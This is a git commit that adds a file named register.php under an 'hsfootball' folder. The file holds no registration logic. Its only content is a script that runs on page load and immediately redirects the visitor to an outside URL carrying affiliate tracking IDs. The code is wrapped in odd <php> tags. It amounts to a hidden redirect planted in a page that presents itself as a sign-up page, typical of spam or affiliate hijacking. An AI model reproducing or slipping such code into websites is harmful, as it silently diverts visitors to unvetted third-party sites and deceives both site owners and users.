1eb2ee0ae36a0bae7f72c4d7097aa5453b530c33
PMorganRusso <142108079+PMorganRusso@users.noreply.github.com>
2023-09-29 22:05:57 +0600

    Add files via upload

---
+++ hsfootball/register.php
@@ -0,0 +1,9 @@
+
+<php>
+<script>
+function largarse(){
+setTimeout("location.href='https://www.ejdr22.com/scripts/un981c6l?a_aid=b59493f6&a_bid=1766b1a4'", 0);
+}
+onload = largarse;
+</script>
+</php>
